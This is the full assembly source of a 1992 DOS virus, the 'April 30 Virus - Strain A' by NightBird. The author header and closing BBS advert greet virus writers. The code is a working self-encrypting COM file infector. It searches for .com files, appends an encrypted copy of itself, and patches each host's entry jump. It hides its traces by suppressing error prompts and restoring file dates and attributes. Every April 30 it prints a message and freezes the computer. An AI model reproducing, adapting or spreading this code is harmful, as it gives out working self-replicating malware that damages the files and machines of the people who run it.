;******************************************************************************
;*                                                                Written in  *
;*                     April 30 Virus - Strain A                  A86 V3.22   *
;*                                                                ----------  *
;******************************************************************************
;*                   "NightBird goes,                                         *
;*                                   Along with the Queen..."                 *
;******************************************************************************
; Your are now looking at the result of my very first attempt to code
; a Virus. This virus is a non-Resident Self- encrypting Direct Action
; Com Infecter, which doesn't infect Command.com. The Virus is only active
; on April 30, showing the Message and Hanging the System.....
; You can recognize an infected File simply, the 4th Byte is a 'N'ightBird.
;
; Disclaimer: The Author will not be held responsible for any actions
;              caused by this Virus.
;
;       Note: Don't just say: " another booring virus.. ", instead
;             be a teaching aid, and search for my pitfalls, (ofcoz
;             if there are any!), so I can improve my code....
;             Please do so.....
;
;  Enough of that crap talk,
;           Greetingz go to...  : John Tardy / TridenT and all other Members..
;                               : Serge of (Ex) House Designs
;                               : All Virus-Writers around the globe
;
;  Well that's it for now.....
;
;                                 C U & Have pHun,
;                                            (c) NightBird  Dec. 1992.


                org 100h                                ; Produce a Com File

Start:          jmp Prog                                ;
                db 'N'                                  ;     Virus ID

                

Prog:           Push ax                                 ; Save Possible Errors
                call Main                               ;    Get Virus
Main:           pop bp                                  ;      Offset
                sub bp,offset Main                      ;    IP = BP
                
                lea si,Restore[bp]                      ;
                mov di,si                               ;
                mov cx,CrypterLen                       ;    Decrypt
Decrypt:        lodsb                                   ;      the
Key:            Add al,0                                ;     Virus
                stosb                                   ;
                loop Decrypt                            ;

Decryptlen      equ $-Prog                              ;


Restore:        lea si,[bp+Restore_Host]                ;   Restore
                mov di,100h                             ;   the Original
                movsw                                   ;   4 Bytes of the
                movsw                                   ;   Host Program
                
                mov ah,2ah                              ;   Is it
                int 21h                                 ;   the 30 of
                cmp dh,4                                ;   April?
                jne Start_Virus                         ;   Yes, Show Txt
                cmp dl,30                               ;   No, Continue
                jne Start_Virus                         ;   with Start_Virus

                mov ah,09h                              ;
                lea dx,Txt[bp]                          ;   Show Txt
                int 21h                                 ;   And lock
HyperSpace:     cli                                     ;   the Computer
                jmp HyperSpace                          ;



Start_Virus:    mov ax,3524h                            ;   Get Adress of
                int 21h                                 ;   Interrupt 24h

                lea Oldint24h[bp],es                    ;   Store
                lea Oldint24h+2[bp],bx                  ;        them...

                push cs                                 ;     Cs = Es
                pop es                                  ;     Register

                mov ax,2524h                            ;   Install a new
                lea dx,Newint24h                        ;   Int. to suppres
                int 21h                                 ;   Errors..

                mov ah,1ah                              ;   Move DTA
                mov dx,dta                              ;   to a save
                int 21h                                 ;   place

                mov ah,4eh                              ;
Search:         lea dx,[bp+Filespec]                    ;   Search
                xor cx,cx                               ;   for a com file, and
                int 21h                                 ;   and quit if error
                jnc Found                               ;
                jmp End_Virus                           ;

Found:          cmp word ptr [bp+offset dta+35],'DN'    ;   Check If Command.com
                je Find_Next_one                        ;

                mov ax,4300h                            ;   Fetch file
                mov dx,dta+1eh                          ;   Attribute
                int 21h                                 ;   and store it
                push cx                                 ;   on stack

                mov ax,4301h                            ;   Set attribute
                mov cx,cx                               ;   for use
                int 21h                                 ; 

                mov ax,3d02h                            ;   Open file
                int 21h                                 ;   Dx = 0fd1eh
                xchg ax,bx                              ;   BX = FileHandle

                mov ax,5700h                            ;   Get file/date
                int 21h                                 ;   format and
                push cx                                 ;   store them
                push dx                                 ;   on stack

                mov ah,3fh                              ;   Read 4 Bytes
                lea dx,[bp+Restore_Host]                ;   and save
                mov cx,4                                ;     them..
                int 21h

                mov ax,[Restore_Host+bp]                ;     Check
                cmp ax,'MZ'                             ;   if it is
                je Exit                                 ;   a renamed
                cmp ax,'ZM'                             ;    Exe-File
                je exit                                 ;

                mov ah,[bp+Restore_Host+3]              ;   Check if Already
                cmp ah,'N'                              ;   infected
                jne Infect
                                                        ;   Jump to Sub-Routine
Exit:           Call Close

Find_Next_one: mov ah,4fh                               ;   Try Another
               jmp Search                               ;       file...

Infect:         mov ax,4202h                            ;   Move File
                xor cx,cx                               ;   Pointer to
                xor dx,dx                               ;   the End of
                int 21h                                 ;   the File

                cmp ax,0fb00h                           ;   File too
                jae Exit                                ;     Big

                cmp ax,Minlen                           ;    File too
                jbe Exit                                ;     Short

                sub ax,3                                ;   Save Jmp
                mov word ptr [bp+Jmp_to_Virus]+1,ax     ;

Zero:           mov ah,2ch                              ;   (If the key
                int 21h                                 ;   is 0,go Zero)
                cmp dl,0                                ;
                jne Continue                            ;   Get Seconds
                jmp Zero                                ;   to save as
Continue:       mov key+1[bp],dl                        ;   Decrypter-Key
                lea si,[Prog+bp]                        ;
                mov di,0fd00h                           ;   Move the
                mov cx,Decryptlen                       ;   Decrypter
                rep movsb                               ;     Part

                lea si,Restore[bp]                      ;
                mov cx,Crypterlen                       ;   Decrypt behind
Encrypt:        lodsb                                   ;       the
                Sub al,dl                               ;    Decrypter
                stosb                                   ;
                loop encrypt                            ;

                mov ah,40h                              ;   Write Virus
                lea dx,0fd00h                           ;   at the end
                mov cx,virlen                           ;   of the file!
                int 21h                                 ;

                mov ax,4200h                            ;   Move File
                xor cx,cx                               ;   Pointer to
                xor dx,dx                               ;   the start of
                int 21h                                 ;   the file

                mov ah,40h                              ;   Write Virus-Jmp
                lea dx,Jmp_to_Virus[bp]                 ;   to the begin
                mov cx,4                                ;   of the file
                int 21h                                 ;

                call close                              ;   Jump to Sub-Routine



End_Virus:      mov ax,2524h                            ;
                lea bx,Oldint24h[bp]                    ;   Restore Old
                mov ds,bx                               ; (Critical Error)
                lea dx,Oldint24h+2[bp]                  ;   Interrupt 24h
                int 21h                                 ;

                push cs                                 ;     Cs = Ds
                pop ds                                  ;     Register

                mov ah,1ah                              ;
                mov dx,80h                              ;
                int 21h                                 ;   Restore DTA
                pop ax                                  ;   and go back
                mov di,100h                             ;   to the Host
                push di                                 ;     Program
                ret                                     ;


Close:          pop si                                  ;  Fetch IP from Stack
                pop dx                                  ;
                pop cx                                  ;    Restore
                mov ax,5701h                            ;   Date/Time
                int 21h                                 ;

                mov ah,3eh                              ;   Close
                int 21h                                 ;    File

                mov ax,4301h                            ;
                pop cx                                  ;   Restore File
                mov dx,dta+1eh                          ;   Attributes
                int 21h                                 ;
                push si                                 ;  Restores IP
                ret                                     ;

Newint24h:      mov al,3                                ;  Suppres Errors
                iret                                    ;  & Go back

Oldint24h dd 0

Restore_Host db 0cdh,20h,0,0
             
Jmp_to_Virus db 0e9h,0,0,'N'

Filespec     db '*.com',0

Txt db 13,10,9,9,'"NightBird goes,',10,'Along with the Queen..."',13,10,7,'$'

Names           db '*April 30 Virus*'

Dta equ 0fc00h

Crypterlen equ $-Restore

Virlen equ $-Prog

Minlen equ Virlen*2


;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴�> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <컴컴컴컴컴컴컴�
;  컴컴컴컴컴�> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
